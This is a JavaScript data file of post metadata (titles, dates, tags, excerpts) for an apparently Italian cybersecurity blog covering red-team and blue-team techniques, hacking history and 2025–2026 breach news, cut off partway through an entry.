// [POSTS:START]
const POSTS = [
  {
    "id":      "storia-hacking-captain-crunch",
    "title":   "La storia di Captain Crunch: il fischietto che buc\u00f2 il sistema telefonico americano",
    "date":    "2024-12-20",
    "cat":     "storia",
    "tags":    ["captain crunch", "phreaking", "storia hacking", "anni 70"],
    "excerpt": "John Draper scopr\u00ec che il fischietto omaggio dei cereali Cap'n Crunch emetteva esattamente 2600 Hz \u2014 la frequenza per accedere alle linee trunk AT&T. Cos\u00ec nacque il phreaking."
  },
  {
    "id":      "siem-blue-team",
    "title":   "SIEM e Blue Team: come funziona il centro nevralgico della difesa informatica",
    "date":    "2025-01-05",
    "cat":     "blue",
    "tags":    ["SIEM", "blue team", "SOC", "log", "correlazione"],
    "excerpt": "Il SIEM raccoglie, normalizza e correla log da tutta l'infrastruttura in tempo reale. Guida pratica a come funziona e perch\u00e9 \u00e8 il cuore di ogni Blue Team."
  },
  {
    "id":      "lateral-movement-red-team",
    "title":   "Lateral Movement: come un attaccante si muove nella rete dopo il primo accesso",
    "date":    "2025-01-10",
    "cat":     "red",
    "tags":    ["lateral movement", "red team", "post-exploitation", "pivoting", "pass-the-hash"],
    "excerpt": "Ottenuto il primo foothold, l'attaccante si muove lateralmente verso target pi\u00f9 preziosi. Tecniche, tool e contromisure del lateral movement."
  },
  {
    "id":      "deepfake-crosetto-voice-cloning",
    "title":   "La voce del Ministro: il deepfake che ha truffato l'Italia per 1 milione di euro",
    "date":    "2025-02-10",
    "cat":     "red",
    "tags":    ["deepfake", "voice cloning", "social engineering", "AI", "frode"],
    "excerpt": "Febbraio 2025: una voce artificiale del Ministro Crosetto convince un imprenditore a trasferire 1 milione di euro. Analisi tecnica del primo grande caso italiano di AI fraud."
  },
  {
    "id":      "noname057-ddos-italia-2025",
    "title":   "NoName057(16): quando l'hacktivismo filorusso colpisce l'Italia",
    "date":    "2025-02-18",
    "cat":     "storia",
    "tags":    ["DDoS", "hacktivismo", "NoName057", "geopolitica", "NATO"],
    "excerpt": "Febbraio 2025: aeroporti di Malpensa e Linate, porti di Trieste e Taranto, Intesa Sanpaolo. Come un gruppo Telegram ha dichiarato guerra informatica all'Italia."
  },
  {
    "id":      "nis2-recepimento-italia-dlgs-138",
    "title":   "NIS2 in Italia: cosa cambia con il D.Lgs. 138/2024 \u2014 guida pratica",
    "date":    "2025-03-01",
    "cat":     "blue",
    "tags":    ["NIS2", "ACN", "compliance", "GDPR", "direttiva UE"],
    "excerpt": "La direttiva NIS2 \u00e8 stata recepita in Italia con il D.Lgs. 138/2024. Cosa devono fare aziende e PA per adeguarsi, le scadenze chiave e le sanzioni previste."
  },
  {
    "id":      "tiktok-gdpr-530-milioni",
    "title":   "TikTok e i dati europei in Cina: la multa da 530 milioni che cambia tutto",
    "date":    "2025-05-02",
    "cat":     "news",
    "tags":    ["GDPR", "TikTok", "privacy", "data transfer", "DPC", "UE"],
    "excerpt": "Maggio 2025: la DPC irlandese multa TikTok per 530 milioni di euro. I dati degli utenti europei finivano su server cinesi. Terza sanzione GDPR pi\u00f9 alta di sempre."
  },
  {
    "id":      "hacktivismo-state-sponsored-europa",
    "title":   "La cyberguerra silenziosa: hacktivismo state-sponsored in Europa nel 2025",
    "date":    "2025-06-15",
    "cat":     "storia",
    "tags":    ["hacktivismo", "geopolitica", "state-sponsored", "NoName057", "Killnet"],
    "excerpt": "NoName057(16) \u00e8 responsabile del 90% degli attacchi state-aligned in Europa. Come l'hacktivismo \u00e8 diventato uno strumento di guerra ibrida e perch\u00e9 l'Italia \u00e8 un bersaglio ricorrente."
  },
  {
    "id":      "ransomware-sanita-italiana",
    "title":   "Ospedali sotto attacco: perch\u00e9 la sanit\u00e0 italiana \u00e8 nel mirino del ransomware",
    "date":    "2025-09-24",
    "cat":     "red",
    "tags":    ["ransomware", "sanit\u00e0", "ospedale", "SECTOR16", "supply chain", "ACN"],
    "excerpt": "Dal 2023 una media di 3,5 attacchi al mese contro ospedali italiani. Perch\u00e9 il settore sanitario \u00e8 il bersaglio preferito del ransomware e cosa si pu\u00f2 fare per difendersi."
  },
  {
    "id":      "ai-cybercrime-moltiplicatore-rischio",
    "title":   "L'AI come moltiplicatore di rischio: come i criminali usano i modelli linguistici",
    "date":    "2025-10-15",
    "cat":     "red",
    "tags":    ["AI", "LLM", "phishing", "exploit", "automation"],
    "excerpt": "L'intelligenza artificiale non \u00e8 solo uno strumento difensivo. Nel 2025 i gruppi criminali la usano per automatizzare phishing, accelerare exploit development e scalare gli attacchi."
  },
  {
    "id":      "dark-web-credenziali-italiane-2025",
    "title":   "2,2 milioni di alert: le credenziali italiane sul dark web nel 2025",
    "date":    "2025-11-20",
    "cat":     "blue",
    "tags":    ["dark web", "credential leak", "CRIF", "data breach", "password", "OSINT"],
    "excerpt": "L'Osservatorio Cyber CRIF 2025 ha registrato oltre 2,2 milioni di alert su dati italiani esposti nel dark web, con una crescita del 22% nella gravit\u00e0 media."
  },
  {
    "id":      "report-penetration-test",
    "title":   "Come si legge un report di penetration test: struttura, flag e raccomandazioni",
    "date":    "2026-01-01",
    "cat":     "red",
    "tags":    ["pentest", "report", "vulnerabilit\u00e0", "CVSS", "remediation"],
    "excerpt": "Un report di pentest non \u00e8 solo un elenco di bug. \u00c8 un documento strategico. Come interpretarlo, cosa guardare per primo e come prioritizzare le remediation."
  },
  {
    "id":      "burp-suite-basi",
    "title":   "Burp Suite: guida alle basi per il web application testing",
    "date":    "2026-01-02",
    "cat":     "red",
    "tags":    ["Burp Suite", "web", "proxy", "intercept", "scanner", "OWASP"],
    "excerpt": "Burp Suite \u00e8 lo strumento standard per il web application penetration testing. Proxy, scanner, intruder, repeater: come usarli in un test reale."
  },
  {
    "id":      "reverse-shell-bind-shell",
    "title":   "Reverse shell e bind shell: differenze, uso e detection",
    "date":    "2026-01-03",
    "cat":     "red",
    "tags":    ["reverse shell", "bind shell", "netcat", "payload", "post-exploitation"],
    "excerpt": "Differenza tra reverse shell e bind shell, quando usare l'una o l'altra, come configurarle e come i blue team le rilevano."
  },
  {
    "id":      "privilege-escalation-windows",
    "title":   "Privilege Escalation su Windows: tecniche essenziali per il red team",
    "date":    "2026-01-04",
    "cat":     "red",
    "tags":    ["privilege escalation", "Windows", "red team", "UAC", "token impersonation"],
    "excerpt": "Da user a SYSTEM: le tecniche pi\u00f9 comuni di privilege escalation su Windows, dall'abuso dei servizi ai token impersonation, con esempi pratici."
  },
  {
    "id":      "privilege-escalation-linux",
    "title":   "Privilege Escalation su Linux: da user a root passo dopo passo",
    "date":    "2026-01-05",
    "cat":     "red",
    "tags":    ["privilege escalation", "Linux", "red team", "SUID", "cron", "sudo"],
    "excerpt": "SUID binari, cron job mal configurati, sudo misconfiguration, capabilities: le vie pi\u00f9 comuni per scalare da utente a root su sistemi Linux."
  },
  {
    "id":      "xss-cross-site-scripting",
    "title":   "XSS \u2014 Cross-Site Scripting: capire, sfruttare e difendersi",
    "date":    "2026-01-06",
    "cat":     "red",
    "tags":    ["XSS", "cross-site scripting", "web", "DOM", "CSP", "OWASP"],
    "excerpt": "Reflected, stored, DOM-based: i tre tipi di XSS spiegati con payload reali, scenari d'attacco e le contromisure efficaci tra CSP e sanitizzazione dell'input."
  },
  {
    "id":      "sql-injection-basi",
    "title":   "SQL Injection: dalle basi all'exploitation pratica",
    "date":    "2026-01-07",
    "cat":     "red",
    "tags":    ["SQL injection", "SQLi", "database", "sqlmap", "OWASP", "web"],
    "excerpt": "La SQL injection \u00e8 vecchia ma ancora pericolosissima. Basi teoriche, tipologie (blind, error-based, time-based), uso di sqlmap e come prevenirla con prepared statements."
  },
  {
    "id":      "password-cracking-hashcat-hydra",
    "title":   "Password cracking con Hashcat e Hydra: guida pratica",
    "date":    "2026-01-08",
    "cat":     "red",
    "tags":    ["hashcat", "hydra", "password cracking", "hash", "wordlist", "rockyou"],
    "excerpt": "Hashcat per gli hash offline, Hydra per gli attacchi online: come funzionano, quali modalit\u00e0 usare e come difendersi con policy robuste e hashing corretto."
  },
  {
    "id":      "introduzione-metasploit",
    "title":   "Introduzione a Metasploit: il framework essenziale del penetration tester",
    "date":    "2026-01-09",
    "cat":     "red",
    "tags":    ["Metasploit", "msfconsole", "exploit", "payload", "meterpreter", "red team"],
    "excerpt": "Metasploit \u00e8 il framework pi\u00f9 usato nel penetration testing. Architettura, moduli, payload, meterpreter: una guida per iniziare a usarlo con consapevolezza."
  },
  {
    "id":      "ricognizione-attiva-nmap",
    "title":   "Ricognizione attiva con Nmap: tecniche e script essenziali",
    "date":    "2026-01-10",
    "cat":     "red",
    "tags":    ["nmap", "recon", "port scanning", "NSE", "active reconnaissance"],
    "excerpt": "Nmap \u00e8 il punto di partenza di ogni pentest. Scansioni TCP/UDP, OS fingerprinting, script NSE, timing e tecniche per ridurre il rumore durante le attivit\u00e0."
  },
  {
    "id":      "ricognizione-passiva-osint",
    "title":   "Ricognizione passiva e OSINT: raccogliere informazioni senza toccare il target",
    "date":    "2026-01-11",
    "cat":     "red",
    "tags":    ["OSINT", "passive recon", "Shodan", "theHarvester", "Google dork", "whois"],
    "excerpt": "Prima di toccare il target, un buon pentester raccoglie il pi\u00f9 possibile da fonti aperte. OSINT toolkit: Shodan, theHarvester, Google dork, whois e molto altro."
  },
  {
    "id":      "cose-il-penetration-testing",
    "title":   "Cos'\u00e8 il Penetration Testing: guida completa per chi inizia",
    "date":    "2026-01-12",
    "cat":     "fond",
    "tags":    ["penetration testing", "pentest", "ethical hacking", "metodologia", "scoping"],
    "excerpt": "Cosa significa fare un penetration test, come si struttura un engagement, le fasi dalla ricognizione al report e la differenza tra pentest, red team e vulnerability assessment."
  },
  {
    "id":      "threat-hunting-intro",
    "title":   "Threat Hunting: cercare l'attaccante nella rete prima che faccia danni",
    "date":    "2026-02-01",
    "cat":     "blue",
    "tags":    ["threat hunting", "blue team", "IOC", "TTPs", "MITRE ATT&CK"],
    "excerpt": "Il threat hunting non aspetta gli alert: va a cercare attivamente le minacce nascoste nella rete. Metodologia, ipotesi, fonti dati e integrazione con MITRE ATT&CK."
  },
  {
    "id":      "analisi-malware-base",
    "title":   "Analisi malware per principianti: statica, dinamica e sandbox",
    "date":    "2026-02-02",
    "cat":     "blue",
    "tags":    ["malware analysis", "sandbox", "reverse engineering", "strings", "Wireshark"],
    "excerpt": "Come analizzare un campione malware senza eseguirlo (analisi statica) e cosa osservare durante l'esecuzione in ambiente isolato (analisi dinamica)."
  },
  {
    "id":      "phishing-riconoscere-rispondere",
    "title":   "Phishing: come riconoscerlo, analizzarlo e rispondere all'incidente",
    "date":    "2026-02-03",
    "cat":     "blue",
    "tags":    ["phishing", "email", "social engineering", "blue team", "IR", "header analysis"],
    "excerpt": "Il phishing \u00e8 ancora il vettore d'attacco numero 1. Come analizzare un'email sospetta, estrarre gli indicatori di compromissione e gestire l'incidente."
  },
  {
    "id":      "vulnerability-management",
    "title":   "Vulnerability Management: come prioritizzare e correggere le vulnerabilit\u00e0",
    "date":    "2026-02-04",
    "cat":     "blue",
    "tags":    ["vulnerability management", "CVSS", "patch", "Nessus", "OpenVAS", "risk"],
    "excerpt": "Avere un elenco di CVE non basta. Il vulnerability management \u00e8 un processo continuo: scoperta, valutazione, prioritizzazione e remediation nel ciclo corretto."
  },
  {
    "id":      "hardening-linux",
    "title":   "Hardening Linux: rendere un sistema pi\u00f9 sicuro passo dopo passo",
    "date":    "2026-02-05",
    "cat":     "blue",
    "tags":    ["hardening", "Linux", "CIS benchmark", "SSH", "sudo", "UFW", "auditd"],
    "excerpt": "Checklist pratica per hardening di sistemi Linux: configurazione SSH sicura, firewall, permessi, logging, rimozione servizi inutili e CIS benchmark."
  },
  {
    "id":      "hardening-windows",
    "title":   "Hardening Windows: configurazioni essenziali per ridurre la superficie d'attacco",
    "date":    "2026-02-06",
    "cat":     "blue",
    "tags":    ["hardening", "Windows", "GPO", "Defender", "bitlocker", "event logging"],
    "excerpt": "Hardening di un sistema Windows: Group Policy, Defender configurato, BitLocker, logging degli eventi, disabilitazione di LLMNR/NetBIOS e protocolli legacy."
  },
  {
    "id":      "threat-intelligence-principianti",
    "title":   "Threat Intelligence per principianti: capire chi attacca e come",
    "date":    "2026-02-07",
    "cat":     "blue",
    "tags":    ["threat intelligence", "CTI", "IOC", "TTPs", "MISP", "OSINT"],
    "excerpt": "La threat intelligence trasforma dati grezzi in conoscenza utile per la difesa. Tipi di intelligence, fonti OSINT, MISP e come integrare gli IOC nei sistemi di difesa."
  },
  {
    "id":      "ids-ips-suricata",
    "title":   "IDS/IPS con Suricata: rilevare e bloccare gli attacchi in tempo reale",
    "date":    "2026-02-08",
    "cat":     "blue",
    "tags":    ["IDS", "IPS", "Suricata", "regole", "network security", "NIDS"],
    "excerpt": "Suricata \u00e8 uno degli IDS/IPS open source pi\u00f9 potenti. Come installarlo, scrivere regole, interpretare gli alert e integrarlo in un SOC."
  },
  {
    "id":      "incident-response-processo",
    "title":   "Incident Response: il processo per rispondere a un attacco informatico",
    "date":    "2026-02-09",
    "cat":     "blue",
    "tags":    ["incident response", "IR", "DFIR", "containment", "forensics", "NIST"],
    "excerpt": "Cosa fare nelle prime ore dopo un incidente di sicurezza. Il processo IR in 6 fasi secondo NIST: preparazione, identificazione, contenimento, eradicazione, recovery, lessons learned."
  },
  {
    "id":      "wireshark-analisi-traffico",
    "title":   "Wireshark: analisi del traffico di rete per il Blue Team",
    "date":    "2026-02-10",
    "cat":     "blue",
    "tags":    ["Wireshark", "packet analysis", "network", "pcap", "TLS", "blue team"],
    "excerpt": "Wireshark \u00e8 lo strumento di riferimento per l'analisi del traffico di rete. Filtri essenziali, follow TCP stream, analisi di attacchi reali e cosa cercare in un pcap sospetto."
  },
  {
    "id":      "analisi-log-windows-event-id",
    "title":   "Analisi dei log Windows: gli Event ID che ogni Blue Team deve conoscere",
    "date":    "2026-02-11",
    "cat":     "blue",
    "tags":    ["Windows", "event log", "Event ID", "SIEM", "blue team", "threat hunting"],
    "excerpt": "Gli Event ID di Windows raccontano tutto: login, escalation, lateral movement, persistence. Guida agli ID fondamentali e come usarli per rilevare attivit\u00e0 sospette."
  },
  {
    "id":      "cose-il-blue-team",
    "title":   "Cos'\u00e8 il Blue Team: ruoli, strumenti e differenza con il Red Team",
    "date":    "2026-02-12",
    "cat":     "blue",
    "tags":    ["blue team", "SOC", "incident response", "difesa", "detection", "SIEM"],
    "excerpt": "Il Blue Team difende, rileva e risponde. Cosa fanno concretamente un analista SOC, un threat hunter e un incident responder, e quali strumenti usano ogni giorno."
  },
  {
    "id":      "cypherpunks",
    "title":   "I Cypherpunk: il manifesto che ha ispirato Bitcoin, Tor e la crittografia moderna",
    "date":    "2026-03-01",
    "cat":     "storia",
    "tags":    ["cypherpunk", "crittografia", "privacy", "Eric Hughes", "PGP", "storia"],
    "excerpt": "Nel 1993 Eric Hughes scrisse il Manifesto Cypherpunk. Un documento che ha dato forma a Tor, PGP, Bitcoin e all'idea che la privacy sia un diritto da difendere con il codice."
  },
  {
    "id":      "edward-snowden",
    "title":   "Edward Snowden e la sorveglianza di massa: cosa ci ha insegnato il leak della NSA",
    "date":    "2026-03-02",
    "cat":     "storia",
    "tags":    ["Snowden", "NSA", "PRISM", "sorveglianza", "whistleblower", "privacy"],
    "excerpt": "Giugno 2013: un contractor NSA vola a Hong Kong con quattro laptop e cambia per sempre la nostra comprensione della sorveglianza digitale globale."
  },
  {
    "id":      "wikileaks-assange",
    "title":   "WikiLeaks e Julian Assange: trasparenza radicale e le sue conseguenze",
    "date":    "2026-03-03",
    "cat":     "storia",
    "tags":    ["WikiLeaks", "Assange", "whistleblower", "diplomaticables", "Manning", "storia"],
    "excerpt": "Dal 2006 WikiLeaks ha pubblicato milioni di documenti riservati. La storia di Julian Assange tra libert\u00e0 di stampa, spionaggio e anni di reclusione nell'ambasciata ecuadoriana."
  },
  {
    "id":      "storia-ransomware",
    "title":   "Storia del ransomware: dal floppy disk di Popp ai miliardi di RaaS",
    "date":    "2026-03-04",
    "cat":     "storia",
    "tags":    ["ransomware", "storia", "AIDS Trojan", "WannaCry", "RaaS", "CryptoLocker"],
    "excerpt": "Il primo ransomware fu distribuito su floppy disk nel 1989 da un biologo. Trent'anni dopo \u00e8 un mercato da miliardi. La storia completa di come siamo arrivati qui."
  },
  {
    "id":      "sony-hack-2014",
    "title":   "Sony Pictures Hack 2014: quando la Corea del Nord colp\u00ec Hollywood",
    "date":    "2026-03-05",
    "cat":     "storia",
    "tags":    ["Sony", "hack", "Corea del Nord", "APT", "studio", "storia"],
    "excerpt": "Novembre 2014: gli hacker di Guardians of Peace cancellano i sistemi di Sony Pictures e pubblicano film inediti, email private e dati di 47.000 dipendenti. Dietro c'era Pyongyang."
  },
  {
    "id":      "caso-hess-cuckoo-egg",
    "title":   "Il caso Cuckoo's Egg: Clifford Stoll e la prima indagine di cyber spionaggio della storia",
    "date":    "2026-03-06",
    "cat":     "storia",
    "tags":    ["Cuckoo's Egg", "Clifford Stoll", "KGB", "spionaggio", "storia", "1986"],
    "excerpt": "1986: Clifford Stoll trova uno scompenso di 75 centesimi nei log di un mainframe universitario. Finir\u00e0 per smascherare una rete di spie al servizio del KGB."
  },
  {
    "id":      "anonymous-lulzsec",
    "title":   "Anonymous e LulzSec: hacktivismo, chaos e la fine dell'anonimato online",
    "date":    "2026-03-07",
    "cat":     "storia",
    "tags":    ["Anonymous", "LulzSec", "hacktivismo", "Operation Payback", "Sabu", "storia"],
    "excerpt": "Dal 2008 al 2012 Anonymous e LulzSec hanno attaccato Scientology, PayPal, Sony, FBI e CIA. Come funzionavano, cosa li ha distrutti e cosa resta della loro eredit\u00e0."
  },
  {
    "id":      "stuxnet",
    "title":   "Stuxnet: l'arma digitale che ha sabotato il programma nucleare iraniano",
    "date":    "2026-03-08",
    "cat":     "storia",
    "tags":    ["Stuxnet", "Iran", "SCADA", "cyberwarfare", "NSA", "Unit 8200", "storia"],
    "excerpt": "Nel 2010 un worm sofisticatissimo ha distrutto centrifughe iraniane facendole sembrare funzionanti. Stuxnet \u00e8 la prima cyberarma nota ad aver causato danni fisici reali."
  },
  {
    "id":      "kevin-mitnick",
    "title":   "Kevin Mitnick: il fuggitivo digitale che ha cambiato la cybersecurity",
    "date":    "2026-03-09",
    "cat":     "storia",
    "tags":    ["Kevin Mitnick", "social engineering", "phreaking", "FBI", "storia hacking"],
    "excerpt": "Kevin Mitnick era il ricercato pi\u00f9 famoso d'America \u2014 e non sapeva programmare exploit. Il suo strumento principale era il telefono. La storia del pi\u00f9 grande ingegnere sociale della storia."
  },
  {
    "id":      "morris-worm",
    "title":   "Il Morris Worm del 1988: il primo grande incidente informatico di internet",
    "date":    "2026-03-10",
    "cat":     "storia",
    "tags":    ["Morris Worm", "1988", "internet", "worm", "Cornell", "Robert Morris", "storia"],
    "excerpt": "Il 2 novembre 1988 un worm scritto da uno studente di Cornell mise in ginocchio il 10% di internet. Non era stato pensato per fare danni \u2014 eppure cambi\u00f2 tutto."
  },
  {
    "id":      "clusit-report-2026-italia",
    "title":   "Rapporto Clusit 2026: l'Italia \u00e8 prima in Europa per hacktivismo",
    "date":    "2026-03-12",
    "cat":     "news",
    "tags":    ["Clusit", "report", "statistiche", "ransomware", "Italia", "hacktivismo"],
    "excerpt": "507 incidenti gravi in Italia nel 2025, +42% rispetto al 2024. Il Rapporto Clusit 2026 fotografa un paese sempre pi\u00f9 nel mirino: PA, trasporti e telecomunicazioni i settori pi\u00f9 colpiti."
  },
  {
    "id":      "apple-coruna-webkit-exploit-ios-legacy",
    "title":   "Operazione Coruna: exploit WebKit su iPhone legacy ancora supportati",
    "date":    "2026-03-15",
    "cat":     "news",
    "tags":    ["Apple", "WebKit", "iOS", "exploit", "zero-day", "patch"],
    "excerpt": "Ricercatori scoprono un exploit WebKit attivamente sfruttato contro dispositivi iOS legacy. Apple rilascia patch d'emergenza per modelli considerati obsoleti."
  },
  {
    "id":      "autenticazione-identita-digitale",
    "title":   "Autenticazione e identit\u00e0 digitale: password, MFA, passkey e oltre",
    "date":    "2026-03-15",
    "cat":     "fond",
    "tags":    ["autenticazione", "MFA", "passkey", "FIDO2", "identit\u00e0 digitale", "password"],
    "excerpt": "Come funziona l'autenticazione moderna: dai limiti delle password all'MFA, dalle passkey FIDO2 alle sfide dell'identit\u00e0 digitale nel 2026."
  },
  {
    "id":      "blackcat-professionisti-cybersec-condannati",
    "title":   "BlackCat/ALPHV: i professionisti della cybersecurity condannati per ransomware",
    "date":    "2026-03-15",
    "cat":     "news",
    "tags":    ["BlackCat", "ALPHV", "ransomware", "RaaS", "condanna", "FBI"],
    "excerpt": "Operatori del gruppo ransomware BlackCat/ALPHV, alcuni con background in cybersecurity legittima, ricevono condanne significative dopo operazione coordinata FBI e Europol."
  },
  {
    "id":      "codewall-ai-agent-mckinsey-lilli",
    "title":   "Codewall e l'agente AI Lilli di McKinsey: quando l'automazione incontra il rischio",
    "date":    "2026-03-15",
    "cat":     "news",
    "tags":    ["AI agent", "McKinsey", "Lilli", "automazione", "AI security", "rischio"],
    "excerpt": "L'agente AI Lilli di McKinsey e sistemi simili aprono nuovi vettori di rischio. Come gli AI agent cambiano il panorama delle minacce aziendali."
  },
  {
    "id":      "come-funziona-internet",
    "title":   "Come funziona Internet: dal cavo sottosmarino al tuo browser",
    "date":    "2026-03-15",
    "cat":     "fond",
    "tags":    ["internet", "TCP/IP", "DNS", "BGP", "infrastruttura", "fondamentali"],
    "excerpt": "Quando digiti un URL succedono decine di cose in millisecondi. Dal routing BGP alla risoluzione DNS, dai protocolli TCP/IP al TLS: come funziona davvero Internet."
  },
  {
    "id":      "come-funzionano-le-password",
    "title":   "Come funzionano le password: hashing, salting e perch\u00e9 il testo in chiaro \u00e8 un crimine",
    "date":    "2026-03-15",
    "cat":     "fond",
    "tags":    ["password", "hashing", "salting", "bcrypt", "PBKDF2", "sicurezza"],
    "excerpt": "Le password non vengono memorizzate in chiaro \u2014 o non dovrebbero. Come funziona l'hashing, cos'\u00e8 il salting, perch\u00e9 MD5 \u00e8 obsoleto e cosa usare nel 2026."
  },
  {
    "id":      "come-funziona-un-firewall",
    "title":   "Come funziona un firewall: stateless, stateful, NGFW e WAF a confronto",
    "date":    "2026-03-15",
    "cat":     "fond",
    "tags":    ["firewall", "NGFW", "WAF", "stateful", "packet filtering", "sicurezza di rete"],
    "excerpt": "Un firewall non \u00e8 solo una lista di regole. Differenze tra stateless e stateful inspection, Next-Gen Firewall, WAF e dove collocarli nell'architettura di rete."
  },
  {
    "id":      "commissione-europea-breach-ivanti",
    "title":   "Breach alla Commissione Europea via Ivanti: i dettagli dell'incidente",
    "date":    "2026-03-15",
    "cat":     "news",
    "tags":    ["Commissione Europea", "Ivanti", "breach", "VPN", "exploit", "UE"],
    "excerpt": "Sistemi della Commissione Europea compromessi tramite vulnerabilit\u00e0 nei gateway Ivanti. L'incidente riaccende il dibattito sulla sicurezza delle VPN istituzionali."
  },
  {
    "id":      "crackarmor-linux-apparmor-vulnerabilita",
    "title":   "CrackArmor: vulnerabilit\u00e0 nel profilo AppArmor di Linux espone sistemi enterprise",
    "date":    "2026-03-15",
    "cat":     "news",
    "tags":    ["AppArmor", "Linux", "vulnerabilit\u00e0", "privilege escalation", "kernel", "CVE"],
    "excerpt": "Una debolezza nella configurazione dei profili AppArmor permette escape da container e privilege escalation su distribuzioni enterprise. Analisi tecnica e patch disponibili."
  },
  {
    "id":      "crittografia-basi",
    "title":   "Crittografia: le basi che ogni professionista della sicurezza deve conoscere",
    "date":    "2026-03-15",
    "cat":     "fond",
    "tags":    ["crittografia", "AES", "RSA", "chiave simmetrica", "asimmetrica", "TLS"],
    "excerpt": "Simmetrica vs asimmetrica, cifrari a blocchi e a flusso, firma digitale, PKI e TLS. Le fondamenta crittografiche su cui si regge tutta la sicurezza informatica moderna."
  },
  {
    "id":      "cve-2026-20127-cisco-sdwan-cvss10",
    "title":   "CVE-2026-20127: vulnerabilit\u00e0 CVSS 10.0 in Cisco SD-WAN \u2014 massima criticit\u00e0",
    "date":    "2026-03-15",
    "cat":     "news",
    "tags":    ["Cisco", "SD-WAN", "CVE", "CVSS", "RCE", "patch critica"],
    "excerpt": "Cisco rilascia patch d'emergenza per CVE-2026-20127, vulnerabilit\u00e0 con score CVSS 10.0 che permette remote code execution non autenticato sui controller SD-WAN. Patch subito."
  },
  {
    "id":      "cve-2026-3909-3910-chrome-zero-day",
    "title":   "CVE-2026-3909/3910: zero-day in Chrome attivamente sfruttati",
    "date":    "2026-03-15",
    "cat":     "news",
    "tags":    ["Chrome", "Google", "zero-day", "CVE", "browser", "exploit in the wild"],
    "excerpt": "Google rilascia aggiornamento d'emergenza per due zero-day in Chrome attivamente sfruttati. Le vulnerabilit\u00e0 interessano il motore V8 e permettono sandbox escape."
  },
  {
    "id":      "dns-il-telefono-di-internet",
    "title":   "DNS: il sistema di nomi che trasforma indirizzi in siti web",
    "date":    "2026-03-15",
    "cat":     "fond",
    "tags":    ["DNS", "resolver", "zone", "record", "DoH", "DNS security", "fondamentali"],
    "excerpt": "Il DNS \u00e8 la rubrica di Internet. Come funziona la risoluzione ricorsiva, cosa sono i record A, MX, TXT, come difendersi da DNS hijacking e cosa cambia con DNS over HTTPS."
  },
  {
    "id":      "fortigate-ngfw-credenziali-servizio",
    "title":   "FortiGate NGFW: credenziali di servizio esposte in migliaia di dispositivi",
    "date":    "2026-03-15",
    "cat":     "news",
    "tags":    ["FortiGate", "Fortinet", "NGFW", "credenziali", "esposizione", "firewall"],
    "excerpt": "Ricercatori trovano credenziali di servizio hardcoded in un sottoinsieme di FortiGate NGFW. Migliaia di dispositivi potenzialmente esposti prima della patch."
  },
  {
    "id":      "glassworm-supply-chain-vscode",
    "title":   "GlassWorm: attacco supply chain tramite estensioni VS Code malevole",
    "date":    "2026-03-15",
    "cat":     "news",
    "tags":    ["supply chain", "VS Code", "estensioni", "malware", "sviluppatori", "npm"],
    "excerpt": "La campagna GlassWorm distribuisce malware tramite estensioni VS Code apparentemente legittime. Oltre 50.000 sviluppatori potenzialmente compromessi prima della rimozione."
  },
  {
    "id":      "illinois-minnesota-dati-governo-esposti",
    "title":   "Illinois e Minnesota: dati governativi esposti per mesi su bucket S3 pubblico",
    "date":    "2026-03-15",
    "cat":     "news",
    "tags":    ["data breach", "AWS S3", "governo USA", "misconfiguration", "cloud", "dati esposti"],
    "excerpt": "Database contenenti dati sensibili di cittadini di Illinois e Minnesota rimasti pubblicamente accessibili su bucket S3 per mesi. Il caso della misconfiguration cloud nel settore pubblico."
  },
  {
    "id":      "ingegneria-sociale",
    "title":   "Ingegneria Sociale: come funziona e come difendersi",
    "date":    "2026-03-15",
    "cat":     "fond",
    "tags":    ["ingegneria sociale", "social engineering", "phishing", "pretexting", "vishing", "manipolazione"],
    "excerpt": "L'ingegneria sociale sfrutta la psicologia, non il codice. Pretexting, phishing, vishing, baiting: come funzionano le tecniche di manipolazione e come costruire una cultura di difesa."
  },
  {
    "id":      "lacoste-ransomware-lapsus",
    "title":   "Lacoste colpita da ransomware: rivendicazione del gruppo Lapsus successor",
    "date":    "2026-03-15",
    "cat":     "news",
    "tags":    ["Lacoste", "ransomware", "Lapsus", "fashion", "data exfiltration", "brand"],
    "excerpt": "Il brand francese Lacoste subisce un attacco ransomware rivendicato da un gruppo erede di Lapsus. Dati di dipendenti e fornitori potenzialmente esfiltrati."
  },
  {
    "id":      "lexisnexis-breach-aws-lexis1234",
    "title":   "LexisNexis breach: database legali esposti con credenziale 'lexis1234'",
    "date":    "2026-03-15",
    "cat":     "news",
    "tags":    ["LexisNexis", "breach", "database", "credenziali deboli", "legal", "AWS"],
    "excerpt": "Un database LexisNexis contenente milioni di record legali era accessibile con la password 'lexis1234'. Il caso emblematico delle credenziali di default mai cambiate."
  },
  {
    "id":      "match-group-dating-apps-breach",
    "title":   "Match Group: breach su Tinder, OkCupid e Hinge espone dati di milioni di utenti",
    "date":    "2026-03-15",
    "cat":     "news",
    "tags":    ["Match Group", "Tinder", "OkCupid", "Hinge", "breach", "dati personali", "dating"],
    "excerpt": "Un incidente di sicurezza colpisce l'infrastruttura condivisa di Match Group. Dati di profilo, preferenze e messaggi privati di milioni di utenti potenzialmente esposti."
  },
  {
    "id":      "modello-cia",
    "title":   "Il modello CIA: Confidentiality, Integrity, Availability \u2014 le fondamenta della sicurezza",
    "date":    "2026-03-15",
    "cat":     "fond",
    "tags":    ["CIA triad", "confidenzialit\u00e0", "integrit\u00e0", "disponibilit\u00e0", "fondamentali", "sicurezza"],
    "excerpt": "Confidenzialit\u00e0, Integrit\u00e0, Disponibilit\u00e0: la triade CIA \u00e8 il framework concettuale su cui si basa tutta la sicurezza informatica. Spiegata con esempi reali."
  },
  {
    "id":      "modello-osi",
    "title":   "Il modello OSI: i 7 livelli della rete spiegati con attacchi reali",
    "date":    "2026-03-15",
    "cat":     "fond",
    "tags":    ["modello OSI", "rete", "layer", "TCP/IP", "protocolli", "fondamentali"],
    "excerpt": "Il modello OSI divide la comunicazione di rete in 7 livelli. Spiegato non con teoria pura, ma con gli attacchi informatici che operano a ciascun livello."
  },
  {
    "id":      "panera-bread-shinyhunters-breach",
    "title":   "Panera Bread e ShinyHunters: dati di 28 milioni di clienti in vendita sul dark web",
    "date":    "2026-03-15",
    "cat":     "news",
    "tags":    ["Panera Bread", "ShinyHunters", "breach", "dark web", "dati clienti", "food"],
    "excerpt": "Il gruppo ShinyHunters rivendica l'esfiltrazione di dati di 28 milioni di clienti Panera Bread. Email, indirizzi, ultime 4 cifre carte: gi\u00e0 in vendita su forum underground."
  },
  {
    "id":      "pki-certificati-digitali",
    "title":   "PKI e certificati digitali: come funziona la fiducia su Internet",
    "date":    "2026-03-15",
    "cat":     "fond",
